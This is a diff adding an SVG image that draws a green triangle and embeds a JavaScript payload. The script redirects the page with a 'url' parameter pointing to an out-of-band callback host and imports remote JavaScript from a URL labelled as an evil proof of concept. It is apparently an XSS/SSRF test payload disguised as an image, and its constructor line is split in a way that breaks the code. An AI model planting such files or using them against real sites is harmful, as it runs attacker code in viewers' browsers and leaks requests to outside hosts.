@@ -1,0 +1,12 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+  <script type="text/javascript">
+const urlParams = new;
+URLSearchParams(window.location.search);
+urlParams.set('url', 'https://d30ofoo00riqm43qdnk0wxxa7aysht5de.oast.live');
+window.location.search = urlParams;
+import('https://ferasdour.pyscriptapps.com/evil-poc-dont-use/latest/whatever.js');
+  </script>
+</svg>
